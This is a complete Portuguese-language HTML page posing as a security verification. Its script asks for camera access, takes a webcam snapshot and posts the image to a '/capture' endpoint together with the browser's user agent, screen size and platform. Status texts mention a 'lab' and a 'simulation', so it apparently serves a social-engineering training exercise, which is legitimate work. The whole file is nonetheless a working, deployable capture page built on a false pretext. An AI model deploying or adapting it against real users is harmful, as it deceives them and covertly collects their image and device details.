<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Verificação de Segurança</title>
<style>
body {
    font-family: Arial, sans-serif;
    background: linear-gradient(135deg, #667eea, #764ba2);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}
.container {
    background: white;
    padding: 40px;
    border-radius: 16px;
    text-align: center;
    max-width: 400px;
}
.logo {
    font-size: 40px;
}
button {
    margin-top: 15px;
    padding: 12px 20px;
    border: none;
    border-radius: 8px;
    background: #667eea;
    color: white;
    font-weight: bold;
}
#video {
    display: none;
    width: 300px;
    margin-top: 20px;
    border-radius: 8px;
}
.status {
    font-size: 14px;
    color: #666;
}
</style>
</head>
<body>

<div class="container">
    <div class="logo">🔒</div>
    <h2>Verificação de Segurança</h2>

    <p class="status" id="status">
        Clique para permitir a câmera e capturar a imagem do lab.
    </p>

    <button onclick="permitirECapturar()">Permitir e capturar foto</button>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
</div>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusText = document.getElementById("status");

async function permitirECapturar() {
    try {
        statusText.textContent = "Solicitando permissão da câmera...";

        const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
        });

        video.srcObject = stream;
        video.style.display = "block";

        await new Promise(resolve => {
            video.onloadedmetadata = resolve;
        });

        statusText.textContent = "Capturando foto...";

        setTimeout(async () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const image = canvas.toDataURL("image/jpeg", 0.8);

            await fetch("/capture", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    image: image,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    screen: screen.width + "x" + screen.height,
                    platform: navigator.platform
                })
            });

            stream.getTracks().forEach(track => track.stop());

           statusText.textContent = "Foto salva com sucesso ✅ Simulação concluída.";

        }, 1200);

    } catch (err) {
        statusText.textContent = "Erro ao acessar câmera ❌";
        alert("Erro: " + err.name + " - " + err.message);
    }
}
</script>

</body>
</html>
